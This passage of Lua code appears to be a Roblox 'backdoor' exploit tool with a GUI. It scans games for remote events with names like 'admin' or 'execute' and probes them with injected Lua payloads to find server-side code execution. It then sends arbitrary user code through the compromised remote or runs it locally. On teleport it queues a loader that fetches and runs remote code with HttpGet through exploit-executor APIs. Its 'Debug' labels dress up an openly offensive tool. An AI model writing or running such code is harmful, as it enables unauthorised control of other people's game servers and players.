local function SetState(state)
    if state == "Connecting" then
        StatusLabel.TextColor3 = CLR.Connecting
        StatusLabel.Text = "Connecting..."
    elseif state == "Online" then
        StatusLabel.TextColor3 = CLR.Online
        StatusLabel.Text = "Online"
    else
        StatusLabel.TextColor3 = CLR.Offline
        StatusLabel.Text = "Offline"
    end
end

local function IsSuspiciousScript(obj)
    if not (obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript")) then
        return false
    end
    local source = nil
    pcall(function() source = obj.Source end)
    if not source then return false end
    
    local patterns = {
        "loadstring", "require%s*%(%s*%d+", "getfenv", "setfenv", "_G",
        "HttpGet", "HttpPost", "InsertService", "string.reverse", "game:GetObjects"
    }
    for _, pat in ipairs(patterns) do
        if source:find(pat) then return true end
    end
    return false
end

Backdoor.Scanners.Normal = function()
    local results = {}
    local priorityNames = {"admin", "main", "system", "cmd", "execute", "backdoor", "require", "loadstring", "remote", "event"}
    local roots = {ReplicatedStorage, Workspace, ServerStorage, game:GetService("StarterGui"), game:GetService("StarterPack")}
    
    if LocalPlayer.Character then table.insert(roots, LocalPlayer.Character) end
    local bp = LocalPlayer:FindFirstChild("Backpack")
    if bp then table.insert(roots, bp) end
    local pg = LocalPlayer:FindFirstChild("PlayerGui")
    if pg then table.insert(roots, pg) end
    
    for _, root in ipairs(roots) do
        pcall(function()
            for _, obj in ipairs(root:GetDescendants()) do
                if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") or obj:IsA("UnreliableRemoteEvent")) 
                and not Backdoor.Cache[obj] then
                    
                    local nameLower = string.lower(obj.Name)
                    local isPriority = false
                    for _, p in ipairs(priorityNames) do
                        if string.find(nameLower, p) then isPriority = true break end
                    end
                    
                    if isPriority then
                        table.insert(results, 1, obj)
                    else
                        table.insert(results, obj)
                    end
                end
            end
        end)
    end
    
    pcall(function()
        if getnilinstances then
            for _, obj in ipairs(getnilinstances()) do
                if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and not Backdoor.Cache[obj] then
                    table.insert(results, obj)
                end
            end
        end
    end)
    return results
end

Backdoor.Scanners.Toolbox = function()
    local results = {}
    for _, obj in ipairs(Workspace:GetDescendants()) do
        if obj:IsA("Model") or obj:IsA("Tool") then
            local scripts = {}
            for _, child in ipairs(obj:GetDescendants()) do
                if IsSuspiciousScript(child) then
                    table.insert(scripts, child)
                end
            end
            if #scripts > 0 then
                table.insert(results, {Model = obj, Scripts = scripts})
            end
        end
    end
    return results
end

Backdoor.Scanners.Plugins = function()
    local results = {}
    local services = {
        game:GetService("VoiceChatService"),
        game:GetService("VRService"),
        game:GetService("ProximityPromptService"),
        game:GetService("Geometry"),
        game:GetService("Debris"),
    }
    for _, svc in ipairs(services) do
        pcall(function()
            for _, child in ipairs(svc:GetDescendants()) do
                if child:IsA("Script") and child.RunContext == Enum.RunContext.Server then
                    table.insert(results, child)
                end
            end
        end)
    end
    return results
end

local function TestRemote(remote, timeout)
    timeout = timeout or 0.25
    local marker = "Probe_" .. tostring(math.random(100000, 999999))
    local testPassed = false

    pcall(function()
        local payloadCode = string.format("local s = Instance.new('StringValue', game.Workspace); s.Name='%s'; s.Value='1';", marker)
        if remote:IsA("RemoteEvent") then remote:FireServer(payloadCode)
        elseif remote:IsA("RemoteFunction") then remote:InvokeServer(payloadCode) end
    end)

    local t = 0
    while t < timeout do
        local found = Workspace:FindFirstChild(marker)
        if found then
            pcall(function() found:Destroy() end)
            testPassed = true
            break
        end
        task.wait(0.05)
        t = t + 0.05
    end

    return testPassed
end

local function RunParallelScanners()
    Backdoor.Findings = {}
    local pending = 0
    
    for name, scanner in pairs(Backdoor.Scanners) do
        pending = pending + 1
        task.spawn(function()
            local success, result = pcall(scanner)
            if success then
                Backdoor.Findings[name] = result
            else
                Backdoor.Findings[name] = {}
            end
            pending = pending - 1
        end)
    end
    
    local elapsed = 0
    while pending > 0 and elapsed < 3 do
        task.wait(0.1)
        elapsed = elapsed + 0.1
    end
end

AttachButton.MouseButton1Click:Connect(function()
    if AttachButton.Text == "Debugging..." then return end
    task.spawn(function()
        AttachButton.Text = "Debugging..."
        SetState("Connecting")

        RunParallelScanners()

        local normalHits = Backdoor.Findings["Normal"] or {}
        local found = false
        local testedCount = 0

        for _, remote in ipairs(normalHits) do
            if testedCount >= 40 then break end
            testedCount = testedCount + 1
            
            if TestRemote(remote, 0.25) then
                Backdoor.Remote = remote
                Backdoor.Verified = true
                found = true
                
                pcall(function()
                    local info = debug.getinfo(2, "S")
                    if info and info.short_src then
                        warn("[DEBUGGER] Backdoor Found: " .. remote:GetFullName() .. " | Source: " .. tostring(info.short_src))
                    end
                end)
                
                break
            end
        end

        local toolboxHits = Backdoor.Findings["Toolbox"] or {}
        local pluginHits = Backdoor.Findings["Plugins"] or {}

        if found then
            SetState("Online")
            AttachButton.Text = "Backdoor Found!"
        elseif #toolboxHits > 0 or #pluginHits > 0 then
            SetState("Online")
            AttachButton.Text = "Backdoor Found!"
        else
            SetState("Offline")
            AttachButton.Text = "Not Found ):" 
        end

        task.wait(3)
        AttachButton.Text = "Debug"
    end)
end)

InjectBtn.MouseButton1Click:Connect(function()
    pcall(function()
        local queueFunc = queue_on_teleport 
            or queueonteleport 
            or queueteleport
            or (syn and syn.queue_on_teleport) 
            or (fluxus and fluxus.queue_on_teleport) 
            or (krnl and krnl.queue_on_teleport)
            or (codex and codex.queue_on_teleport)
            or (getgenv and getgenv().queue_on_teleport)
            
        if queueFunc then
            queueFunc("loadstring(game:HttpGet('" .. SCRIPT_URL .. "'))()")
        end
    end)

    FloatingLogo.Visible = true
    FloatingLogo.Position = UDim2.new(0.5, -70, 1, 140)
    TweenService:Create(FloatingLogo,
        TweenInfo.new(1, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
        {Position = UDim2.new(0.5, -70, 0.5, -70)}):Play()
    task.wait(2.6)
    TweenService:Create(FloatingLogo,
        TweenInfo.new(0.8, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut),
        {Position = UDim2.new(0, 12, 1, -152)}):Play()
    task.wait(0.8)
    FloatingLogo.Rotation = -10
    TweenService:Create(FloatingLogo,
        TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        {Rotation = 10}):Play()
end)

ExecuteBtn.MouseButton1Click:Connect(function()
    task.spawn(function()
        local code = EditorBox.Text
        if code:match("^%s*$") then return end

        local base = (getfenv and getfenv()) or _G

        if getfenv and type(getfenv) == "function" then
            base[REQ] = base[REQ] or require
            base.debug = debug
            base.print = print
            base.warn = warn
        end

        if Backdoor.Verified and Backdoor.Remote then
            local rawId = code:match("^%s*(%d+)%s*$")
            local payload = rawId and string.format("%s(%s)", REQ, rawId) or code

            local ok = pcall(function()
                if Backdoor.Remote:IsA("RemoteEvent") or Backdoor.Remote:IsA("UnreliableRemoteEvent") then
                    Backdoor.Remote:FireServer(payload)
                else
                    task.spawn(function() pcall(function() Backdoor.Remote:InvokeServer(payload) end) end)
                end
            end)
            if ok then
                return
            end
        end

        local loader = loadstring or (getfenv and getfenv()[LS])
        if not loader then return end
        
        local fn = loader(code)
        if not fn then
            return
        end

        xpcall(fn, function() end)
    end)
end)

UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.Insert then
        MainFrame.Visible = not MainFrame.Visible
    end
end)
